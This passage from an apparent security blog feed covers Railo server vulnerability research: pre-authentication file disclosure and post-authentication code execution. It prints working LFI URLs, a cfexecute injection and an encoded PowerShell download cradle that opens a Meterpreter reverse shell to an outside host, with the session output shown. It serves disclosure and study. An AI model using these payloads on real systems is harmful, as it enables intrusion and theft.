</span><span class='line'> [2014-05-15 06:28PM] Finished at 2014-05-15 06:28PM</span></code></pre></td></tr></table></div></figure>


<p>Using this LFI, we can pull the <code>railo-web.xml.cfm</code> file, which contains the administrative password.  Notice that 4.2 only dumps a hash, whilst 4.0 dumps a plaintext password.  This is because versions &lt;= 4.0 blowfish encrypt the password, and > 4.0 actually hashes it.  Here&rsquo;s the relevant code from Railo (ConfigWebFactory.java):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private static void loadRailoConfig(ConfigServerImpl configServer, ConfigImpl config, Document doc) throws IOException  {
</span><span class='line'>        Element railoConfiguration = doc.getDocumentElement();
</span><span class='line'>
</span><span class='line'>        // password
</span><span class='line'>        String hpw=railoConfiguration.getAttribute("pw");
</span><span class='line'>        if(StringUtil.isEmpty(hpw)) {
</span><span class='line'>            // old password type
</span><span class='line'>            String pwEnc = railoConfiguration.getAttribute("password"); // encrypted password (reversable)
</span><span class='line'>            if (!StringUtil.isEmpty(pwEnc)) {
</span><span class='line'>                String pwDec = new BlowfishEasy("tpwisgh").decryptString(pwEnc);
</span><span class='line'>                hpw=hash(pwDec);
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>        if(!StringUtil.isEmpty(hpw))
</span><span class='line'>            config.setPassword(hpw);
</span><span class='line'>        else if (configServer != null) {
</span><span class='line'>            config.setPassword(configServer.getDefaultPassword());
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>As above, they actually encrypted the password using a hard-coded symmetric key; this is where versions &lt;= 4.0 stop.  In > 4.0, after decryption they hash the password (SHA256) and use it as such.  Note that the encryption/decryption is no longer the actual password in > 4.0, so we cannot simply decrypt the value to use and abuse.</p>

<p>Due to the configuration of the web server, we can only pull CFM files; this is fine for the configuration file, but system files prove troublesome&hellip;</p>

<p><img src="http://diyblogger.net/wp-content/uploads/2010/12/billy-mays.jpg"></p>

<p>The second LFI is a trivial XXE that affects versions &lt;= 4.0, and is exploitable out-of-the-box with Metasploit.  Unlike the Jetty LFI, this affects all versions of Railo, both installed and express:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xxe-msf.jpg"></p>

<p>Using this we cannot pull <code>railo-web.xml.cfm</code> due to it containing XML headers, and we cannot use the standard OOB methods for retrieving files.  Timothy Morgan gave a great <a href="http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf">talk</a> at OWASP Appsec 2013 that detailed a neat way of abusing Java XML parsers to obtain RCE via XXE.  The process is pretty interesting; if you submit a URL with a jar:// protocol handler, the server will download the zip/jar to a temporary location, perform some header parsing, and then delete it.  However, if you push the file and leave the connection open, the file will persist.  This vector, combined with one of the other LFI&rsquo;s, could be a reliable pre-authentication RCE, but I was unable to get it working.</p>

<p>The third LFI is just as trivial as the first two, and again stems from the pandemic problem of failing to authenticate at the URL/page level.  <code>img.cfm</code> is a file used to, you guessed it, pull images from the system for display.  Unfortunately, it fails to sanitize anything:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset path="resources/img/#attributes.src#.cfm"&gt;
</span><span class='line'>&lt;cfparam name="application.adminimages" default="#{}#"&gt;
</span><span class='line'>&lt;cfif StructKeyExists(application.adminimages,path) and false&gt;
</span><span class='line'>    &lt;cfset str=application.adminimages[path]&gt;
</span><span class='line'>&lt;cfelse&gt;
</span><span class='line'>    &lt;cfsavecontent variable="str" trim&gt;&lt;cfinclude template="#path#"&gt;&lt;/cfsavecontent&gt;
</span><span class='line'>    &lt;cfset application.adminimages[path]=str&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>By fetching this page with <code>attributes.src</code> set to another CFM file off elsewhere, we can load the file and execute any tags contained therein.  As we&rsquo;ve done above, lets grab <code>railo-web.xml.cfm</code>; we can do this with the following url: <code>http://host:8888/railo-context/admin/img.cfm?attributes.src=../../../../railo-web.xml&amp;thistag.executionmode=start</code> which simply returns</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;railo-configuration pw="d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b" version="4.2"&gt;</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability exists in 3.3 &ndash; 4.2.1 (latest), and is exploitable out-of-the-box on both Railo installed and Express editions.  Though you can only pull CFM files, the configuration file dumps plenty of juicy information.  It may also be beneficial for custom tags, plugins, and custom applications that may house other vulnerable/sensitive information hidden away from the URL.</p>

<p>Curiously, at first glance it looks like it may be possible to turn this LFI into an RFI.  Unfortunately it&rsquo;s not quite that simple; if we attempt to access a non-existent file, we see the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>The error occurred in zip://C:\Documents and Settings\bryan\My Documents\Downloads\railo\railo-express-4.2.1.000-jre-win32\webapps\ROOT\WEB-INF\railo\context\railo-context.ra!/admin/img.cfm: line 29</span></code></pre></td></tr></table></div></figure>


<p>Notice the <code>zip://</code> handler.  This prevents us from injecting a path to a remote host with any other handler.  If, however, the tag looked like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfinclude&gt;#attributes.src#&lt;/cfinclude&gt;</span></code></pre></td></tr></table></div></figure>


<p>Then it would have been trivially exploitable via RFI.  As it stands, it&rsquo;s not possible to modify the handler without prior code execution.</p>

<p>To sum up the LFI&rsquo;s: all versions and all installs are vulnerable via the <code>img.cfm</code> vector.  All versions and all express editions are vulnerable via the Jetty LFI.  Versions &lt;= 4.0 and all installs are vulnerable to the XXE vector.  This gives us reliable LFI in all current versions of Railo.</p>

<p>This concludes our pre-authentication LFI portion of this assessment, which will crescendo with our final post detailing several pre-authentication RCE vulnerabilities.  I expect a quick turnaround for part four, and hope to have it out in a few days.  Stay tuned!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part two - post-authentication rce]]></title>
    <link href="http://hatRiot.github.io/blog/2014/07/24/railo-security-part-two/"/>
    <updated>2014-07-24T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/07/24/railo-security-part-two</id>
    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
<em>Part two &ndash; post-authentication rce</em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>

<p>This post continues our dive into Railo security, this time introducing several post-authentication RCE vulnerabilities discovered in the platform.  As stated in part one of this series, like ColdFusion, there is a task scheduler that allows authenticated users the ability to write local files.  Whilst the existence of this feature sets it as the standard way to shell a Railo box, sometimes this may not work.  For example, in the event of stringent firewall rules, or irregular file permissions, or you&rsquo;d just prefer not to make remote connections, the techniques explored in this post will aid you in this manner.</p>

<p>PHP has an interesting, ahem, <em>feature</em>, where it writes out session information to a temporary file located in a designated path (<a href="http://ar.php.net/manual/en/session.configuration.php">more</a>).  If accessible to an attacker, this file can be used to inject PHP data into, via multiple different vectors such as a User-Agent or some function of the application itself.  Railo does sort of the same thing for its Web and Server interfaces, except these files are always stored in a predictable location.  Unlike PHP however, the name of the file is not simply the session ID, but is rather a quasi-unique value generated using a mixture of pseudo-random and predictable/leaked information.  I&rsquo;ll dive into this here in a bit.</p>

<p>When a change to the interface is made, or a new page bookmark is created, Railo writes this information out to a session file located at <code>/admin/userdata/</code>.  The file is then either created, or an existing one is used, and will be named either <code>web-[value].cfm</code> or <code>server-[value].cfm</code> depending on the interface you&rsquo;re coming in from.  It&rsquo;s important to note the extension on these files; because of the CFM extension, these files will be parsed by the CFML interpreter looking for CF tags, much like PHP will do.  A typical request to add a new bookmark is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /railo-context/admin/web.cfm?action=internal.savedata&action2=addfavorite&favorite=server.request HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>The favorite <code>server.request</code> is then written out to a JSON-encoded array object in the session file, as below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{'fullscreen':'true','contentwidth':'1267','favorites':{'server.request':''}}</span></code></pre></td></tr></table></div></figure>


<p>The next question is then obvious: what if we inject something malicious as a favorite?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /railo-context/admin/web.cfm?action=internal.savedata&action2=addfavorite&favorite=&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;pre&gt;#output#&lt;/pre&gt;&lt;/cfoutput&gt; HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Our session file will then read:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{'fullscreen':'true','contentwidth':'1267','favorites':{'&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;pre&gt;##output##&lt;/pre&gt;&lt;/cfoutput&gt;':'','server.charset':''}}</span></code></pre></td></tr></table></div></figure>


<p>Whilst our injected data is written to the file, astute readers will note the double # around our Coldfusion variable.  This is ColdFusion&rsquo;s way of escaping a number sign, and will therefore not reflect our command output back into the page.  To my knowledge, there is no way to obtain shell output without the use of the variable tags.</p>

<p>We have two options for popping this: inject a command to return a shell or inject a web shell that simply writes output to a file that is then accessible from the web root.  I&rsquo;ll start with the easiest of the two, which is injecting a command to return a shell.</p>

<p>I&rsquo;ll use PowerSploit&rsquo;s Invoke-Shellcode script and inject a Meterpreter shell into the Railo process.  Because Railo will also quote our single/double quotes, we need to base64 the Invoke-Expression payload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /railo-context/admin/web.cfm?action=internal.savedata&action2=addfavorite&favorite=%3A%3Ccfoutput%3E%3Ccfexecute%20name%3D%22c%3A%5Cwindows%5Csystem32%5Ccmd.exe%22%20arguments%3D%22%2Fc%20PowerShell.exe%20-Exec%20ByPass%20-Nol%20-Enc%20aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA2ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQAnACkA%22%20timeout%3D%2210%22%20variable%3D%22output%22%3E%3C%2Fcfexecute%3E%3C%2Fcfoutput%3E%27 HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Once injected, we hit our session page and pop a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>payload =&gt; windows/meterpreter/reverse_https
</span><span class='line'>LHOST =&gt; 192.168.1.6
</span><span class='line'>LPORT =&gt; 4444
</span><span class='line'>[*] Started HTTPS reverse handler on https://0.0.0.0:4444/
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] 192.168.1.102:50122 Request received for /INITM...
</span><span class='line'>[*] 192.168.1.102:50122 Staging connection for target /INITM received...
</span><span class='line'>[*] Patched user-agent at offset 663128...
</span><span class='line'>[*] Patched transport at offset 662792...
</span><span class='line'>[*] Patched URL at offset 662856...
</span><span class='line'>[*] Patched Expiration Timeout at offset 663728...
</span><span class='line'>[*] Patched Communication Timeout at offset 663732...
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.1.6:4444 -&gt; 192.168.1.102:50122) at 2014-03-24 00:44:20 -0600
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getpid
</span><span class='line'>Current pid: 5064
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: bryan-PC\bryan
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : BRYAN-PC
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64 (Current Process is WOW64)
</span><span class='line'>System Language : en_US
</span><span class='line'>Meterpreter     : x86/win32
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>Because I&rsquo;m using Powershell, this method won&rsquo;t work in Windows XP or Linux systems, but it&rsquo;s trivial to use the next method for that (net user/useradd).</p>

<p>The second method is to simply write out the result of a command into a file and then retrieve it.  This can trivially be done with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>':&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir &gt; ./webapps/www/WEB-INF/railo/context/output.cfm" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;/cfoutput&gt;'</span></code></pre></td></tr></table></div></figure>


<p>Note that we&rsquo;re writing out to the start of web root and that our output file is a CFM; this is a requirement as the web server won&rsquo;t serve up flat files or txt&rsquo;s.</p>

<p>Great, we&rsquo;ve verfied this works.  Now, how to actually figure out what the hell this session file is called?  As previously noted, the file is saved as either <code>web-[VALUE].cfm</code> or <code>server-[VALUE].cfm</code>, the prefix coming from the interface you&rsquo;re accessing it from.  I&rsquo;m going to step through the code used for this, which happens to be a healthy mix of CFML and Java.</p>

<p>We&rsquo;ll start by identifying the session file on my local Windows XP machine: <code>web-a898c2525c001da402234da94f336d55.cfm</code>.  This is stored in <code>www\WEB-INF\railo\context\admin\userdata</code>, of which <code>admin\userdata</code> is accessible from the web root, that is, we can directly access this file by hitting <code>railo-context/admin/userdata/[file]</code> from the browser.</p>

<p>When a favorite it saved, <code>internal.savedata.cfm</code> is invoked and searches through the given list for the function we&rsquo;re performing:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif listFind("addfavorite,removefavorite", url.action2) and structKeyExists(url, "favorite")&gt;
</span><span class='line'>    &lt;cfset application.adminfunctions[url.action2](url.favorite) /&gt;
</span><span class='line'>        &lt;cflocation url="?action=#url.favorite#" addtoken="no" /&gt;</span></code></pre></td></tr></table></div></figure>


<p>This calls down into <code>application.adminfunctions</code> with the specified action and favorite-to-save.  Our addfavorite function is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffunction name="addfavorite" returntype="void" output="no"&gt;
</span><span class='line'>        &lt;cfargument name="action" type="string" required="yes" /&gt;
</span><span class='line'>        &lt;cfset var data = getfavorites() /&gt;
</span><span class='line'>        &lt;cfset data[arguments.action] = "" /&gt;
</span><span class='line'>        &lt;cfset setdata('favorites', data) /&gt;
</span><span class='line'>    &lt;/cffunction&gt;</span></code></pre></td></tr></table></div></figure>


<p>Tunneling yet deeper into the rabbit hole, we move forwards into setdata:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffunction name="setdata" returntype="void" output="no"&gt;
</span><span class='line'>        &lt;cfargument name="key" type="string" required="yes" /&gt;
</span><span class='line'>        &lt;cfargument name="value" type="any" required="yes" /&gt;
</span><span class='line'>        &lt;cflock name="setdata_admin" timeout="1" throwontimeout="no"&gt;
</span><span class='line'>            &lt;cfset var data = loadData() /&gt;
</span><span class='line'>            &lt;cfset data[arguments.key] = arguments.value /&gt;
</span><span class='line'>            &lt;cfset writeData() /&gt;
</span><span class='line'>        &lt;/cflock&gt;
</span><span class='line'>    &lt;/cffunction&gt;</span></code></pre></td></tr></table></div></figure>


<p>This function actually reads in our data file, inserts our new favorite into the data array, and writes it back down.  Our question is &ldquo;how do you know the file?&rdquo;, so naturally we need to head into loadData:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> &lt;cffunction name="loadData" access="private" output="no" returntype="any"&gt;
</span><span class='line'>        &lt;cfset var dataKey = getDataStoreName() /&gt;
</span><span class='line'>            [..snip..]</span></code></pre></td></tr></table></div></figure>


<p>And yet deeper we move, into getDataStoreName:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffunction name="getDataStoreName" access="private" output="no" returntype="string"&gt;
</span><span class='line'>        &lt;cfreturn "#request.admintype#-#getrailoid()[request.admintype].id#" /&gt;
</span><span class='line'>    &lt;/cffunction&gt;</span></code></pre></td></tr></table></div></figure>


<p>At last we&rsquo;ve reached the apparent event horizon of this XML black hole; we see the return will be of form <code>web-#getrailoid()[web].id#</code>, substituting in web for request.admintype.</p>

<p>I&rsquo;ll skip some of the digging here, but lets fast forward to Admin.java:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> private String getCallerId() throws IOException {
</span><span class='line'>        if(type==TYPE_WEB) {
</span><span class='line'>            return config.getId();
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p>Here we return the ID of the caller (our ID, for reference, is what we&rsquo;re currently tracking down!), which calls down into config.getId:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   @Override
</span><span class='line'>    public String getId() {
</span><span class='line'>        if(id==null){
</span><span class='line'>            id = getId(getSecurityKey(),getSecurityToken(),false,securityKey);
</span><span class='line'>        }
</span><span class='line'>        return id;
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>Here we invoke getId which, if null, calls down into an overloaded getId which takes a security key and a security token, along with a boolean (false) and some global securityKey value.  Here&rsquo;s the function in its entirety:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>public static String getId(String key, String token,boolean addMacAddress,String defaultValue) {
</span><span class='line'>
</span><span class='line'>    try {
</span><span class='line'>        if(addMacAddress){// because this was new we could swutch to a new ecryption // FUTURE cold we get rid of the old one?
</span><span class='line'>            return Hash.sha256(key+";"+token+":"+SystemUtil.getMacAddress());
</span><span class='line'>        }
</span><span class='line'>        return Md5.getDigestAsString(key+token);
</span><span class='line'>    }
</span><span class='line'>    catch (Throwable t) {
</span><span class='line'>        return defaultValue;
</span><span class='line'>    }
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>Our ID generation is becoming clear; it&rsquo;s essentially the MD5 of key + token, the key being returned from <code>getSecurityKey</code> and the token coming from <code>getSecurityToken</code>.  These functions are simply getters for private global variables in the ConfigImpl class, but tracking down their generation is fairly trivial.  All state initialization takes place in ConfigWebFactory.java.  Let&rsquo;s first check out the security key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private static void loadId(ConfigImpl config) {
</span><span class='line'>        Resource res = config.getConfigDir().getRealResource("id");
</span><span class='line'>        String securityKey = null;
</span><span class='line'>        try {
</span><span class='line'>            if (!res.exists()) {
</span><span class='line'>                res.createNewFile();
</span><span class='line'>                IOUtil.write(res, securityKey = UUIDGenerator.getInstance().generateRandomBasedUUID().toString(), SystemUtil.getCharset(), false);
</span><span class='line'>            }
</span><span class='line'>            else {
</span><span class='line'>                securityKey = IOUtil.toString(res, SystemUtil.getCharset());
</span><span class='line'>            }
</span><span class='line'>        }
</span></code></pre></td></tr></table></div></figure>


<p>Okay, so our key is a randomly generated UUID from the safehaus library.  This isn&rsquo;t very likely to be guessed/brute-forced, but the value is written to a file in a consistent place.  We&rsquo;ll return to this.</p>

<p>The second value we need to calculate is the security token, which is set in ConfigImpl:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>public String getSecurityToken() {
</span><span class='line'>        if(securityToken==null){
</span><span class='line'>            try {
</span><span class='line'>                securityToken = Md5.getDigestAsString(getConfigDir().getAbsolutePath());
</span><span class='line'>            }
</span><span class='line'>            catch (IOException e) {
</span><span class='line'>                return null;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>        return securityToken;
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>Gah!  This is predictable/leaked!  The token is simply the MD5 of our configuration directory, which in my case is <code>C:\Documents and Settings\bryan\My Documents\Downloads\railo-express-4.0.4.001-jre-win32\webapps\www\WEB-INF\railo</code>  So let&rsquo;s see if this works.</p>

<p>We MD5 the directory (<code>20132193c7031326cab946ef86be8c74</code>), then prefix this with the random UUID (securityKey) to finally get:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo -n "3ec59952-b5de-4502-b9d7-e680e5e2071820132193c7031326cab946ef86be8c74" | md5sum
</span><span class='line'>a898c2525c001da402234da94f336d55  -</span></code></pre></td></tr></table></div></figure>


<p>Ah-ha!  Our session file will then be web-a898c2525c001da402234da94f336d55.cfm, which exactly lines up with what we&rsquo;re seeing:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo_session_proof.jpg"></p>

<p>I mentioned that the config directory is leaked; default Railo is pretty promiscuous:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo_bad_page.jpg"></p>

<p>As you can see, from this we can derive the base configuration directory and figure out one half of the session filename.  We now turn our attention to figuring out exactly what the securityKey is; if we recall, this is a randomly generated UUID that is then written out to a file called <code>id</code>.</p>

<p>There are two options here; one, guess or predict it, or two, pull the file with an LFI.  As alluded to in part one, we can set the error handler to any file on the system we want.  As we&rsquo;re in the mood to discuss post-authentication issues, we can harness this to fetch the required <code>id</code> file containing this UUID:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-error-handler-lfi.jpg"></p>

<p>When we then access a non-existant page, we trigger the template and the system returns our file:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-uuid.jpg"></p>

<p>By combining these specific vectors and inherit weaknesses in the Railo architecture, we can obtain post-authentication RCE without forcing the server to connect back.  This can be particularly useful when the Task Scheduler just isn&rsquo;t an option.  This vulnerability has been implemented into clusterd as an auxiliary module, and is available in the latest dev build (0.3.1).  A quick example of this:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-log-injection-exec.jpg"></p>

<p>I mentioned briefly at the start of this post that there were &ldquo;several&rdquo; post-authentication RCE vulnerabilities.  Yes.  Several.  The one documented above was fun to find and figure out, but there is another way that&rsquo;s much cleaner.  Railo has a function that allows administrators to set logging information, such as level and type and location.  It also allows you to create your own logging handlers:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-log-settings.jpg"></p>

<p>Here we&rsquo;re building an HTML layout log file that will append all ERROR logs to the file.  And we notice we can configure the path and the title.  And the log extension.  Easy win.  By modifying the path to <code>/context/my_file.cfm</code> and setting the title to <code>&lt;cfdump var="#session#"&gt;</code> we can execute arbitrary commands on the file system and obtain shell access.  The file is not created once you create the log, but once you select Edit and then Submit for some reason.  Here&rsquo;s the HTML output that&rsquo;s, by default, stuck into the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;&lt;cfdump var="#session#"&gt;&lt;/title&gt;
</span><span class='line'>&lt;style type="text/css"&gt;
</span><span class='line'>&lt;!--
</span><span class='line'>body, table {font-family: arial,sans-serif; font-size: x-small;}
</span><span class='line'>th {background: #336699; color: #FFFFFF; text-align: left;}
</span><span class='line'>--&gt;
</span><span class='line'>&lt;/style&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body bgcolor="#FFFFFF" topmargin="6" leftmargin="6"&gt;
</span><span class='line'>&lt;hr size="1" noshade&gt;
</span><span class='line'>Log session start time Mon Jun 30 23:06:17 MDT 2014&lt;br&gt;
</span><span class='line'>&lt;br&gt;
</span><span class='line'>&lt;table cellspacing="0" cellpadding="4" border="1" bordercolor="#224466" width="100%"&gt;
</span><span class='line'>&lt;tr&gt;
